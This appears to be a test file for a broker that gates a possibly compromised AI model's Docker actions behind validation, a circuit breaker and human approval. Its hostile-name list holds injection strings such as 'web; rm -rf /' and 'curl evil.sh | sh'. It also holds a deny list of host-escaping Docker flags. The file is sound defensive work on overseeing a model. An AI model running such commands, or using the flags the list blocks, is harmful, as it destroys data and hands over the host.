import { beforeEach, describe, expect, it, vi } from "vitest";

/**
 * WHAT CAN A COMPROMISED MODEL EXPRESS?
 *
 * That is the only question worth asking about the write path. The model reaches it
 * through `proposeAction` with a recipe id and a parameter bag, so these tests take the
 * attacker's seat and try to get something dangerous into argv — a shell metacharacter, a
 * path traversal, an image nobody vetted, a container the user set up themselves.
 *
 * The defence is not string sanitisation. It is that argv is BUILT from validated
 * parameters inside broker.ts, never assembled from input, and that nothing runs on a
 * proposal at all — a person has to approve the exact rendered command.
 */

const execFileMock = vi.fn();
const record = vi.fn();
const propose = vi.fn();
const approve = vi.fn();
const finish = vi.fn();
const createdNames = vi.fn();
const get = vi.fn();
const executedLastHour = vi.fn();
const denialsSince = vi.fn();
const revokeAll = vi.fn();

vi.mock("node:child_process", () => ({
  execFile: Object.assign(execFileMock, {
    [Symbol.for("nodejs.util.promisify.custom")]: (...args: unknown[]) => execFileMock(...args),
  }),
}));
vi.mock("@/lib/database/client", () => ({ getDatabase: () => ({}) }));
vi.mock("@/lib/observability/logger", () => ({
  logger: { info: vi.fn(), warn: vi.fn(), error: vi.fn() },
}));
vi.mock("@careeros/database", () => ({
  createLabGrantsRepository: () => ({ findLive: vi.fn(), revokeAll }),
  createLabActionsRepository: () => ({ record, denialsSince }),
  createLabActionRequestsRepository: () => ({
    propose,
    approve,
    finish,
    createdNames,
    get,
    executedLastHour,
  }),
}));

beforeEach(() => {
  execFileMock.mockReset();
  record.mockReset();
  propose.mockReset();
  approve.mockReset();
  finish.mockReset();
  createdNames.mockReset();
  get.mockReset();
  executedLastHour.mockReset();
  denialsSince.mockReset();
  revokeAll.mockReset();
  createdNames.mockResolvedValue([]);
  // Quiet defaults: nothing suspicious has happened and nothing has run recently, so the
  // security layer stays out of the way of the tests that are about something else.
  denialsSince.mockResolvedValue([]);
  executedLastHour.mockResolvedValue(0);
  get.mockResolvedValue(null);
  propose.mockImplementation(async (row: Record<string, unknown>) => ({ ...row, id: "req-1" }));
  execFileMock.mockResolvedValue({ stdout: "abc123\n", stderr: "" });
});

async function propose_(params: Record<string, unknown>, recipe = "container.run") {
  const { proposeAction } = await import("./broker");
  return proposeAction({ userId: "u1", recipe, params, actor: "model", origin: "test" });
}

describe("a proposal cannot express a command that is not in the file", () => {
  // Each of these is a real shape of injection: shell metacharacters, argument
  // smuggling, traversal, and simply asking for something outside the catalogue.
  const hostileNames = [
    "web; rm -rf /",
    "web && curl evil.sh | sh",
    "../../etc/passwd",
    "web $(whoami)",
    "web`id`",
    "--privileged",
    "-v/:/host",
    "WEB",
    "web name",
    "a".repeat(64),
    "",
  ];

  for (const name of hostileNames) {
    it(`rejects the name ${JSON.stringify(name)}`, async () => {
      const res = await propose_({ image: "nginx", name });
      expect(res.ok).toBe(false);
      expect(propose).not.toHaveBeenCalled();
      expect(execFileMock).not.toHaveBeenCalled();
    });
  }

  it("rejects an image nobody vetted, however it is spelled", async () => {
    for (const image of ["evil/miner:latest", "nginx:latest", "../nginx", "nginx:1.27-alpine", ""]) {
      const res = await propose_({ image, name: "web" });
      expect(res.ok, `image ${JSON.stringify(image)} should be refused`).toBe(false);
    }
    // Surrounding whitespace is trimmed rather than refused, and that is safe precisely
    // because the trimmed value is a KEY looked up in a fixed map — the worst it can do
    // is resolve to something already in the catalogue.
    expect((await propose_({ image: " nginx ", name: "web" })).ok).toBe(true);
    // ...and the catalogue key resolves to a pinned tag, not to what was typed.
    const ok = await propose_({ image: "nginx", name: "web" });
    expect(ok.ok).toBe(true);
    if (ok.ok) expect(ok.argv[0]).toContain("nginx:1.27-alpine");
  });

  it("rejects a port that is privileged, fractional, or not a number", async () => {
    for (const port of [80, 0, -1, 70000, 1024.5, "8080; ls", "abc", {}]) {
      const res = await propose_({ image: "nginx", name: "web", port });
      expect(res.ok, `port ${JSON.stringify(port)} should be refused`).toBe(false);
    }
    const ok = await propose_({ image: "nginx", name: "web", port: 8080 });
    expect(ok.ok).toBe(true);
  });

  it("rejects a recipe that is not in the catalogue", async () => {
    const res = await propose_({}, "shell.exec");
    expect(res.ok).toBe(false);
    expect(record.mock.calls[0][0].decision).toBe("denied");
  });

  it("logs rejected parameters — a model that keeps failing validation is worth seeing", async () => {
    await propose_({ image: "nginx", name: "web; rm -rf /" });
    expect(record).toHaveBeenCalledTimes(1);
    expect(record.mock.calls[0][0].decision).toBe("denied");
    expect(record.mock.calls[0][0].actor).toBe("model");
  });
});

describe("the prefix cannot be escaped", () => {
  it("always names the container fadi-<name>, whatever was asked for", async () => {
    const res = await propose_({ image: "nginx", name: "web" });
    expect(res.ok).toBe(true);
    if (res.ok) {
      const args = res.argv[0];
      expect(args).toContain("fadi-web");
      // Nothing in argv names a container without the prefix.
      const nameIdx = args.indexOf("--name");
      expect(args[nameIdx + 1].startsWith("fadi-")).toBe(true);
    }
  });

  it("does not let a name that already looks prefixed double up or slip through", async () => {
    const res = await propose_({ image: "nginx", name: "fadi-web" });
    // The prefix is prepended, never trusted from input — so this is simply fadi-fadi-web,
    // which is harmless and honest, not a name that escapes the namespace.
    expect(res.ok).toBe(true);
    if (res.ok) expect(res.argv[0]).toContain("fadi-fadi-web");
  });
});

describe("proposing runs nothing", () => {
  it("touches the machine only after a person approves", async () => {
    const res = await propose_({ image: "nginx", name: "web", port: 8080 });
    expect(res.ok).toBe(true);
    // The whole asymmetry in one assertion.
    expect(execFileMock).not.toHaveBeenCalled();
  });

  it("records a proposal as something that did NOT happen", async () => {
    await propose_({ image: "nginx", name: "web" });
    // A log that counted proposals as actions would show a machine full of containers
    // that were never created.
    expect(record.mock.calls[0][0].decision).toBe("denied");
    expect(record.mock.calls[0][0].detail).toMatch(/awaiting your approval/i);
  });
});

describe("Fadi may only stop or remove what it started", () => {
  it("refuses a container the user set up themselves", async () => {
    createdNames.mockResolvedValue(["web"]);
    const res = await propose_({ name: "database" }, "container.stop");
    expect(res.ok).toBe(false);
    if (!res.ok) expect(res.message).toMatch(/started itself/i);
    expect(propose).not.toHaveBeenCalled();
  });

  it("allows one it created", async () => {
    createdNames.mockResolvedValue(["web"]);
    const res = await propose_({ name: "web" }, "container.stop");
    expect(res.ok).toBe(true);
    if (res.ok) expect(res.argv[0]).toEqual(["docker", "stop", "fadi-web"]);
  });

  it("checks the same way for removal, which is the destructive one", async () => {
    createdNames.mockResolvedValue([]);
    const res = await propose_({ name: "web" }, "container.remove");
    expect(res.ok).toBe(false);
  });
});

describe("approval runs exactly what was shown", () => {
  it("refuses when the stored command no longer matches the recipe's output", async () => {
    approve.mockResolvedValue({
      id: "req-1",
      recipe: "container.run",
      params: { image: "nginx", name: "web", port: null },
      // Tampered: what is in the row is not what the recipe renders.
      argv: [["docker", "run", "-d", "--privileged", "--name", "fadi-web", "nginx:1.27-alpine"]],
    });
    const { approveAndRun } = await import("./broker");

    const res = await approveAndRun({ userId: "u1", requestId: "req-1" });

    expect(res.ok).toBe(false);
    expect(execFileMock).not.toHaveBeenCalled();
    expect(finish.mock.calls[0][1] ?? finish.mock.calls[0][2]).toBeTruthy();
  });

  it("runs when the re-rendered command matches", async () => {
    approve.mockResolvedValue({
      id: "req-1",
      recipe: "container.run",
      params: { image: "nginx", name: "web", port: null },
      argv: [["docker", "run", "-d", "--name", "fadi-web", "nginx:1.27-alpine"]],
    });
    const { approveAndRun } = await import("./broker");

    const res = await approveAndRun({ userId: "u1", requestId: "req-1" });

    expect(res.ok).toBe(true);
    expect(execFileMock).toHaveBeenCalledWith(
      "docker",
      ["run", "-d", "--name", "fadi-web", "nginx:1.27-alpine"],
      expect.anything(),
    );
  });

  it("does nothing when the request is no longer pending", async () => {
    // approve() returns null when the row was already answered or has expired — the
    // guard is the UPDATE's WHERE clause, so a second click cannot run the command again.
    approve.mockResolvedValue(null);
    const { approveAndRun } = await import("./broker");

    const res = await approveAndRun({ userId: "u1", requestId: "req-1" });

    expect(res.ok).toBe(false);
    expect(execFileMock).not.toHaveBeenCalled();
  });
});

describe("the catalogue itself stays safe as it grows", () => {
  it("pins every image — no floating tag decides what code runs here", async () => {
    const { RECIPES } = await import("./broker");
    // Reached through the one recipe that takes an image, so this reads what the renderer
    // actually emits rather than a constant that might stop being used.
    const images = new Set<string>();
    for (const key of ["nginx", "postgres", "redis", "grafana", "portainer"]) {
      const params = RECIPES["container.run"].validate({ image: key, name: "x" });
      expect(params).not.toBeNull();
      const argv = RECIPES["container.run"].render(params!);
      images.add(argv[0].args[argv[0].args.length - 1]);
    }
    for (const image of images) {
      expect(image).toMatch(/:/);
      // ":latest" means the thing that runs tomorrow is not the thing reviewed today.
      expect(image).not.toMatch(/:latest$/);
    }
  });

  it("no recipe can emit a flag that hands over the host", async () => {
    const { RECIPES, RECIPE_IDS } = await import("./broker");
    // These are the flags that turn "a container" into "your machine". A future recipe
    // that needs one is a decision to be argued for in review, not a quiet addition.
    const forbidden = [
      "--privileged",
      "--network=host",
      "host",
      "--pid",
      "--cap-add",
      "--user",
      "--userns",
      "-v",
      "--volume",
      "--mount",
      "--device",
    ];

    for (const id of RECIPE_IDS) {
      const recipe = RECIPES[id];
      // Every recipe validates against the widest legal parameter bag it accepts.
      const params =
        recipe.validate({ image: "nginx", name: "x", port: 8080 }) ?? recipe.validate({ name: "x" });
      expect(params, `${id} should accept a legal parameter bag`).not.toBeNull();
      for (const command of recipe.render(params!)) {
        for (const arg of command.args) {
          expect(forbidden, `${id} emitted ${arg}`).not.toContain(arg);
        }
      }
    }
  });
});

describe("the security layer stops things, not just describes them", () => {
  it("THE BREAKER: a burst of machine denials closes everything and refuses to propose", async () => {
    denialsSince.mockResolvedValue(
      Array.from({ length: 6 }, () => ({ actor: "model", createdAt: new Date() })),
    );

    const res = await propose_({ image: "nginx", name: "web" });

    expect(res.ok).toBe(false);
    // Tripping REVOKES. A breaker that only refuses the next call leaves every existing
    // permission standing, which is the opposite of what the moment calls for.
    expect(revokeAll).toHaveBeenCalledWith("u1");
    expect(propose).not.toHaveBeenCalled();
    expect(execFileMock).not.toHaveBeenCalled();
  });

  it("the breaker ignores a person declining prompts", async () => {
    denialsSince.mockResolvedValue(
      Array.from({ length: 9 }, () => ({ actor: "user", createdAt: new Date() })),
    );
    const res = await propose_({ image: "nginx", name: "web" });
    expect(res.ok).toBe(true);
    expect(revokeAll).not.toHaveBeenCalled();
  });

  it("the hourly ceiling refuses rather than queues", async () => {
    executedLastHour.mockResolvedValue(999);
    const res = await propose_({ image: "nginx", name: "web" });
    expect(res.ok).toBe(false);
    if (!res.ok) expect(res.message).toMatch(/nothing ran/i);
    expect(propose).not.toHaveBeenCalled();
  });

  it("an irreversible action gets a shorter prompt life than a reversible one", async () => {
    const reversible = await propose_({ image: "nginx", name: "web" });
    createdNames.mockResolvedValue(["web"]);
    const irreversible = await propose_({ name: "web" }, "container.remove");

    expect(reversible.ok && irreversible.ok).toBe(true);
    if (reversible.ok && irreversible.ok) {
      expect(irreversible.policy.confirm).toBe("type-name");
      expect(reversible.policy.confirm).toBe("click");
      expect(irreversible.policy.ttlMinutes).toBeLessThan(reversible.policy.ttlMinutes);
    }
  });
});

describe("typing the name is not decoration", () => {
  const removal = {
    id: "req-1",
    recipe: "container.remove",
    params: { name: "web" },
    argv: [["docker", "rm", "-f", "fadi-web"]],
  };

  it("refuses to run an irreversible action without the exact name", async () => {
    get.mockResolvedValue(removal);
    const { approveAndRun } = await import("./broker");

    // "fadi-web " is absent on purpose: surrounding whitespace is trimmed, because a
    // person who typed the name correctly and picked up a trailing space from a copy has
    // still read and typed the name. The check is on intent, not on keystroke hygiene.
    for (const typed of [undefined, "", "web", "fadi-wed", "DELETE", "fadi_web", "FADI-WEB"]) {
      const res = await approveAndRun({ userId: "u1", requestId: "req-1", confirmation: typed });
      expect(res.ok, `"${typed}" should not confirm`).toBe(false);
    }
    expect(execFileMock).not.toHaveBeenCalled();
    // And the approval was never claimed, so a typo does not burn the prompt.
    expect(approve).not.toHaveBeenCalled();
  });

  it("accepts the exact name and runs", async () => {
    get.mockResolvedValue(removal);
    approve.mockResolvedValue(removal);
    const { approveAndRun } = await import("./broker");

    const res = await approveAndRun({ userId: "u1", requestId: "req-1", confirmation: "fadi-web" });

    expect(res.ok).toBe(true);
    expect(execFileMock).toHaveBeenCalledWith("docker", ["rm", "-f", "fadi-web"], expect.anything());
  });

  it("does not demand typing for a reversible action", async () => {
    const start = {
      id: "req-2",
      recipe: "container.run",
      params: { image: "nginx", name: "web", port: null },
      argv: [["docker", "run", "-d", "--name", "fadi-web", "nginx:1.27-alpine"]],
    };
    get.mockResolvedValue(start);
    approve.mockResolvedValue(start);
    const { approveAndRun } = await import("./broker");

    const res = await approveAndRun({ userId: "u1", requestId: "req-2" });
    expect(res.ok).toBe(true);
  });
});
